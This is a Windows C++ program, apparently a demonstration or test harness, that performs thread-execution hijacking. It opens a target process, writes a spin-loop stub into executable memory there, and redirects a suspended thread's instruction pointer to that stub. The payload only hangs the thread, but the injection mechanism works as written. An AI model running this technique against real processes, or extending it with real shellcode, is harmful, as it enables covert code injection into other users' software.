#include <windows.h>

#include <cstdint>
#include <iostream>
#include <sstream>
#include <string>

static bool parse_dword(const std::string& text, DWORD& value) {
    std::istringstream stream(text);
    stream >> value;
    return !stream.fail();
}

int main(int argc, char** argv) {
    if (argc != 3) {
        std::cerr << "usage: " << argv[0] << " <pid> <worker_tid>\n";
        return 1;
    }

    DWORD pid = 0;
    DWORD tid = 0;

    if (!parse_dword(argv[1], pid) || !parse_dword(argv[2], tid)) {
        std::cerr << "[hijacker] invalid pid or tid\n";
        return 1;
    }

    HANDLE process = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );

    if (!process) {
        std::cerr << "[hijacker] openprocess failed, error=" << GetLastError() << "\n";
        return 1;
    }

    BYTE loop_code[] = {
        0xeb,
        0xfe
    };

    void* remote_code = VirtualAllocEx(
        process,
        nullptr,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remote_code) {
        std::cerr << "[hijacker] virtualallocex failed, error=" << GetLastError() << "\n";
        CloseHandle(process);
        return 1;
    }

    if (!WriteProcessMemory(process, remote_code, loop_code, sizeof(loop_code), nullptr)) {
        std::cerr << "[hijacker] writeprocessmemory failed, error=" << GetLastError() << "\n";
        VirtualFreeEx(process, remote_code, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    HANDLE thread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
        FALSE,
        tid
    );

    if (!thread) {
        std::cerr << "[hijacker] openthread failed, error=" << GetLastError() << "\n";
        VirtualFreeEx(process, remote_code, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    if (SuspendThread(thread) == static_cast<DWORD>(-1)) {
        std::cerr << "[hijacker] suspendthread failed, error=" << GetLastError() << "\n";
        CloseHandle(thread);
        CloseHandle(process);
        return 1;
    }

    CONTEXT context = {};
    context.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(thread, &context)) {
        std::cerr << "[hijacker] getthreadcontext failed, error=" << GetLastError() << "\n";
        ResumeThread(thread);
        CloseHandle(thread);
        CloseHandle(process);
        return 1;
    }

#if defined(_M_X64)
    context.Rip = reinterpret_cast<DWORD64>(remote_code);
#else
    context.Eip = reinterpret_cast<DWORD>(remote_code);
#endif

    if (!SetThreadContext(thread, &context)) {
        std::cerr << "[hijacker] setthreadcontext failed, error=" << GetLastError() << "\n";
        ResumeThread(thread);
        CloseHandle(thread);
        CloseHandle(process);
        return 1;
    }

    ResumeThread(thread);

    std::cout << "[hijacker] redirected tid=" << tid
              << " to 0x" << std::hex << reinterpret_cast<std::uintptr_t>(remote_code)
              << std::dec << "\n";

    CloseHandle(thread);
    CloseHandle(process);
    return 0;
}
